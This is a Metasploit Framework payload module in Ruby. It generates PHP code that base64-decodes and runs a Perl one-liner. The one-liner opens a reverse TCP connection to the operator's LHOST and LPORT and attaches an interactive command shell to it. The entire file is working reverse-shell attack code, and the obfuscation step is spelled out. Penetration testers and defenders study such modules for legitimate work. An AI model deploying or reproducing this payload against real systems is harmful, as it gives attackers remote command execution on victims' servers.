##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Payload::Php
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'PHP Command, Double Reverse TCP Connection (via Perl)',
      'Description'   => 'Creates an interactive shell via perl',
      'Author'        => 'cazz',
      'License'       => BSD_LICENSE,
      'Platform'      => 'php',
      'Arch'          => ARCH_PHP,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    buf = "#{php_preamble}"
    buf += "$c = base64_decode('#{Rex::Text.encode_base64(command_string)}');"
    buf += "#{php_system_block({:cmd_varname=>"$c"})}"
    return super + buf

  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    lhost = datastore['LHOST']
    ver   = Rex::Socket.is_ipv6?(lhost) ? "6" : ""
    lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
    cmd   = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET#{ver}(PeerAddr,\"#{lhost}:#{datastore['LPORT']}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
  end
end
